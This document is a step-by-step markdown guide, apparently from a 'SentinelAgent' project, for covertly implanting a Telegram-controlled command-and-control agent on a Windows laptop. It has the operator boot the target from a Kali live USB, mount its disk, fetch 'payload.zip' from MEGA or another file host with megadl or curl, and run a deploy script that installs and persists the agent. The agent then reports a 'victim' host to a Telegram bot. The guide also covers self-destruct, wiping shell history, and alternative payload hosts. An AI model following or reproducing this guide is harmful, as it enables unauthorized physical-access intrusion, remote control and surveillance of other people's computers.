# MEGA Upload + Deploy - Step by Step

Five steps. No second USB needed.

---

## 1. Create a MEGA account (one time, on your normal machine)

1. Open **https://mega.nz** in your browser.
2. Click **Create Account** (or sign in if you already have one).
3. Verify your email.
4. The free tier gives 20 GB - way more than the 184 KB zip you need.

---

## 2. Upload `payload.zip` to MEGA

The file is already built for you:
```
D:\Sarthak\Coding\My Codes\Cybersecurity\SentinelAgent\Nim\telegram\build\payload.zip
```
(184 KB - contains the agent binary + `deploy_telegram.sh` + `install.cmd`)

1. On the MEGA web UI, click **File Upload** (or drag-and-drop).
2. Pick `payload.zip` from the path above.
3. Wait for the upload to finish (a few seconds - it's tiny).
4. Right-click the uploaded `payload.zip` in the MEGA file list.
5. Click **Get link** (or **Share** -> **Copy link**).
6. MEGA will give you a link that looks like:
   ```
   https://mega.nz/file/AbCdEfGh#iJkLmNoPqRsTuVwXyZ
   ```
   **Copy that entire link** - you'll need it in step 4.

You only need the zip - the `deploy_telegram.sh` and `agent_telegram_prod.exe`
will be reconstructed on the target from the zip's contents.

---

## 3. Make the Kali live USB (one time, on any machine)

If you don't already have one:

**Option A - On Linux (or WSL):**
```bash
wget https://cdimage.kali.org/kali-2024.3/kali-linux-2024.3-live-amd64.iso
sudo dd if=kali-linux-2024.3-live-amd64.iso of=/dev/sdX bs=4M status=progress conv=fsync
```

**Option B - On Windows, using Rufus:**
1. Download Kali ISO from https://www.kali.org/get-kali/#kali-live
2. Open Rufus, select the USB, select the ISO, hit Start.

---

## 4. Boot the target from the Kali USB and run the deploy

1. Plug the Kali USB into the target laptop.
2. Power on. Mash **F12** (or the laptop's boot-menu key) until the
   one-time boot menu appears.
3. Pick the USB.
4. At the Kali menu, choose **Live** (or "Try without installing").
5. Wait for the desktop. Open a terminal (the black-square icon in
   the dock, or **Activities** -> type "terminal").

Then in the terminal:

```bash
sudo -i
# Find the Windows NTFS partition
lsblk -f
# Look for a 100+ GB NTFS partition. It will be /dev/sda2 or /dev/nvme0n1p3.
# Set it as $PART for the rest:
PART=/dev/sda2

# Mount the Windows partition
mkdir -p /mnt/target
mount "$PART" /mnt/target

# Download the payload zip from MEGA
megadl 'https://mega.nz/file/PASTE-YOUR-MEGA-LINK-HERE' --path /tmp
# Replace PASTE-YOUR-MEGA-LINK-HERE with the actual link from step 2.
# megatools is pre-installed on most Kali live ISOs; if not, the
# deploy_telegram.sh script will install it automatically when it
# sees a MEGA URL.

# Extract
unzip -o /tmp/payload.zip -d /tmp/

# Run the deploy (drop-in install + persistence + launch)
bash /tmp/deploy_telegram.sh "$PART" --agent /tmp/agent_telegram.exe

# When it returns:
umount /mnt/target
reboot
```

If `megadl` is missing and `apt` hasn't fetched packages yet, you may
see one error - just re-run the `megadl` line after the apt index is
populated (takes ~30s on a fresh Kali live).

---

## 5. Pull the USB, walk away, watch Telegram

- Pull the Kali USB **before** the Windows logo appears.
- The user logs in normally.
- Within a few seconds, your Telegram chat with **@IamSentinal_bot**
  shows:
  ```
  SentinelC2 / Telegram online

  {"user":"victim","host":"DESKTOP-ABC123","pid":...,
   "is_admin":<true|false>,...}
  ```
- Run `/help` and `/sysinfo` from your Telegram app to confirm.

**Stuck?** Open `/status` in the chat to see the agent's view of
its own state. If the agent never shows up, walk through the
"Troubleshooting" section in DEPLOYMENT_GUIDE.md.

---

## End of engagement

1. From your Telegram chat, send **`/selfdestruct`**.
2. Wait for the "selfdestruct complete" message.
3. In MEGA, delete `payload.zip` (and any re-uploads).
4. **Revoke the bot token in @BotFather** (`/revoke` -> rebuild
   before next engagement).

---

## Two safety things to remember

1. **The MEGA link is now in the live-USB shell history.** When
   you `history -c` at the end, wipe it: `history -c && history -w`.
   The bash history file is at `~/.bash_history`.

2. **The bot token is the only thing that grants access.** If
   anyone finds the URL (or the link is logged anywhere) and the
   bot is still active, they can impersonate the operator. Always
   `/revoke` the token at end of engagement.

---

## If MEGA is too painful: 30-second alternative

If you'd rather skip MEGA entirely, any of these work and give a
**real** direct-download URL that `curl` can fetch natively (no
`megatools` needed):

| Service | How |
| ------- | --- |
| **GitHub Gist** | https://gist.github.com -> drop payload.zip in a "Secret gist" -> raw URL works |
| **Your own VPS** | `scp payload.zip user@host:~/` then `python3 -m http.server 8000` |
| **Dropbox** | Upload -> share -> "Anyone with the link" -> change `?dl=0` to `?dl=1` in the URL |
| **Google Drive** | Upload -> share -> "Anyone with the link" -> replace `/file/d/X/view?usp=sharing` with `/uc?export=download&id=X` |
| **transfer.sh** | From any machine that can reach it: `curl --upload-file payload.zip https://transfer.sh/payload.zip` |

Then on the Kali USB:

```bash
curl -fsSL -o /tmp/payload.zip "https://YOUR-REAL-DIRECT-DOWNLOAD-URL"
unzip -o /tmp/payload.zip -d /tmp/
bash /tmp/deploy_telegram.sh /dev/sda2 --agent /tmp/agent_telegram.exe
umount /mnt/target
reboot
```

The deploy script already auto-installs `megatools` when it sees a
`mega.nz` URL and falls back to `curl` for direct-download URLs, so
both paths are one-liner.
